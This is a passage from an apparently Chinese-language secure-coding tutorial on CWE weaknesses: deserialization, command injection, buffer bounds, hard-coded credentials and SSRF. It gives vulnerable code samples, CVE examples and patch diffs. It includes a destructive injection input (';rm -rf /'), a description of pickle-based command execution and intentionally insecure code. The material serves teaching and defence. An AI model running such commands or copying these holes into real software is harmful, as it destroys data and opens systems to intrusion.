138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 72px, transparent 72px, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px)"><code>pitch <span class="token operator">=</span> <span class="token function">PAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>width<span class="token punctuation">)</span> <span class="token operator">*</span> tjPixelSize<span class="token punctuation">[</span><span class="token operator">*</span>pixelFormat<span class="token punctuation">]</span><span class="token punctuation">,</span> align<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dstBuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span> <span class="token operator">></span>
    <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    <span class="token punctuation">(</span>dstBuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pitch <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token function">_throwg</span><span class="token punctuation">(</span><span class="token string">"tjLoadImage(): Memory allocation failure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/502.html" target="_blank" rel="noreferrer">【B】CWE-502: Deserialization of Untrusted Data</a></h3><p class="x-p">反序列化不受信任的数据，也就是没有检查反序列化后的结果是否是有效的。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">try</span>
<span class="token punctuation">{</span>
    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span>JButton</span> button <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span>JButton</span><span class="token punctuation">)</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">如果攻击者替换了文件内容，可能导致风险。<code class="x-inline-highlight">readObject()</code>应当做如下改进：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span>
<span class="token punctuation">{</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span><span class="token punctuation">(</span><span class="token string">"Cannot be deserialized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">class</span> <span class="token class-name">ExampleProtocol</span><span class="token punctuation">(</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">dataReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># Code that would be here would parse the incoming data</span>
        <span class="token comment"># After receiving headers, call confirmAuth() to authenticate</span>
        <span class="token keyword">pass</span>

    <span class="token keyword">def</span> <span class="token function">confirmAuth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            token <span class="token operator">=</span> cPickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'AuthToken'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> check_hmac<span class="token punctuation">(</span>token<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> getSecretKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> AuthFail
            self<span class="token punctuation">.</span>secure_data <span class="token operator">=</span> token<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> AuthFail
</code></pre></div><p class="x-p">这段代码没有验证传入数据是否合法。攻击者可以构造一个非法的序列化对象<code class="x-inline-highlight">AuthToken</code>，该对象通过实例化Python的子进程之一来执行任意命令。例如，攻击者可以构建一个利用Python子进程模块的<code class="x-inline-highlight">pickle</code>，该模块会生成新进程并包含许多用于各种用途的参数。由于<code class="x-inline-highlight">Pickle</code>库允许对象定义如何<code class="x-inline-highlight">unpickle</code>，因此攻击者可以指示<code class="x-inline-highlight">unpickle</code>进程在子进程模块中调用<code class="x-inline-highlight">Popen</code>并执行<code class="x-inline-highlight">/bin/sh</code>。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2020-13091" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2020-13091</a></p></div></div><p class="x-p">如果<code class="x-inline-highlight">__reduce__</code>调用了<code class="x-inline-highlight">os.system</code>，1.0.3版本的Python Pandas库可以从传递给<code class="x-inline-highlight">read_pickle()</code>函数的不信任文件中反序列化，并执行命令。注意<code class="x-inline-highlight">read_pickle()</code>在<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_pickle.html" target="_blank" rel="noreferrer" class="x-inline-link">文档</a>中已经被标记为不安全的，用户有责任确保传入的文件是可信的。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/77.html" target="_blank" rel="noreferrer">【C】CWE-77: Improper Neutralization of Special Elements used in a Command (&#x27;Command Injection&#x27;)</a></h3><p class="x-p">命令注入，用户输入没有被中和，或错误地中和处理，导致执行的预期命令被修改。</p><p class="x-p">命令注入漏洞通常发生在以下情况：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>数据从不受信任的来源进入应用程序。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>数据是字符串的一部分，由应用程序作为命令执行。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>通过执行命令，应用程序为攻击者提供了其原本无法拥有的权限或能力。</p></div></div><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> cmd<span class="token punctuation">[</span>CMD_MAX<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/usr/bin/cat "</span><span class="token punctuation">;</span>
    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">上述程序出于对运维人员的教学目的将会以管理员权限执行。此时有命令注入的风险，例如传入<code class="x-inline-highlight">";rm -rf /"</code>。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span>
    <span class="token operator">+</span>btype<span class="token operator">+</span>
    <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span>
<span class="token punctuation">)</span>

<span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">原因是类似的，<code class="x-inline-highlight">btype</code>参数有被注入的风险。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2024-32027" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2024-32027</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1</a></p></div></div><p class="x-p">此补丁移除了很多Python脚本中的<code class="x-inline-highlight">shell=True</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"><code>subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>run_cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">)</span>
subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>run_cmd<span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">)</span>
</code></pre></div><p class="x-p">不加<code class="x-inline-highlight">shell=True</code>时，命令作为列表直接传递给操作系统，例如：<code class="x-inline-highlight">subprocess.run(['ls', '-l'])</code>； 这是更安全的。<br/>使用<code class="x-inline-highlight">shell=True</code>时，命令通过解释器（例如<code class="x-inline-highlight">/bin/sh</code>或<code class="x-inline-highlight">cmd.exe</code>）运行，例如：<code class="x-inline-highlight">subprocess.run('ls -l', shell=True)</code>；这可能导致命令注入。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/119.html" target="_blank" rel="noreferrer">【C】CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer</a></h3><p class="x-p">缓冲区范围内的操作限制不当，产品对内存缓冲区执行操作，但它可以从缓冲区预期边界之外的内存位置读取或写入。</p><p class="x-p">包括前面提到的越界读取和越界写入。范围较为广泛，这里不详细展开了。</p><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/798.html" target="_blank" rel="noreferrer">【B】CWE-798: Use of Hard-coded Credentials</a></h3><p class="x-p">使用硬编码的凭证，即凭证在源代码中直接出现。</p><h4 class="x-h3">Example 1</h4><p class="x-p">下面的代码硬编码了用户名和密码去连接数据库：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"scott"</span><span class="token punctuation">,</span> <span class="token string">"tiger"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre></div><p class="x-p">有权限访问到此源码的员工可以利用这点闯入系统。更坏的情况是如果攻击者能够访问到程序的字节码，可以使用<code class="x-inline-highlight">javap -c</code>命令反汇编，得到明文密码，例如：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger
</code></pre></div><h4 class="x-h3">Example 2</h4><p class="x-p">硬编码加密后的密码同样是有问题的。理由同上，只要在源程序中明文出现，都会有很大的风险。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> <span class="token function">VerifyAdmin</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token string">"68af404b513073584c4b6f22b6c63e6b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Entering Diagnostic Mode...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2020-35296" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2020-35296</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md</a></p></div></div><p class="x-p">管理员面板有默认账户<code class="x-inline-highlight">admin:admin</code>。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/918.html" target="_blank" rel="noreferrer">【B】CWE-918: Server-Side Request Forgery (SSRF)</a></h3><p class="x-p">服务端请求伪造，攻击者通过伪造服务器发起的请求，使服务器端的应用程序访问受信任的第三方服务器或资源。通常，攻击者利用此漏洞访问内部系统。SSRF可以看作一种跳板攻击。</p><img alt="img" loading="lazy" width="1253" height="440" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;width:800px;height:auto" src="/_next/static/media/ssrf.339fe2b1.jpg"/><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2024-3149" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2024-3149</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1" target="_blank" rel="noreferrer" class="x-inline-link">https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e</a></p></div></div><p class="x-p">AnythingLLM的上传链接功能存在SSRF漏洞，该功能面向具有<code class="x-inline-highlight">manager</code>或<code class="x-inline-highlight">admin</code>角色的用户，使用无头浏览器通过内部<code class="x-inline-highlight">collectorApi</code>处理上传的链接。 攻击者可以通过托管恶意网站并使用该网站执行内部端口扫描、访问未对外公开的内部网络应用程序等操作来利用这一漏洞。</p><p class="x-p">部署AnytingLLM后会有两个<code class="x-inline-highlight">express.js</code>节点运行，分别是<code class="x-inline-highlight">collector</code>和<code class="x-inline-highlight">server</code>。</p><p class="x-p">补丁引入了<code class="x-inline-highlight">comKey</code>检验数据完整性，让攻击者无法构造出合法的请求头部。部分新增的内容如下：<br/><code class="x-inline-highlight">collector/utils/comKey/index.js</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> keyPath <span class="token operator">=</span>
  process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"development"</span>
    <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">../../../server/storage/comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">STORAGE_DIR</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">CommunicationKey</span> <span class="token punctuation">{</span>
  #pubKeyName <span class="token operator">=</span> <span class="token string">"ipc-pub.pem"</span><span class="token punctuation">;</span>
  #storageLoc <span class="token operator">=</span> keyPath<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">text<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\x1b[36m[CommunicationKeyVerify]\x1b[0m </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>text<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#readPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
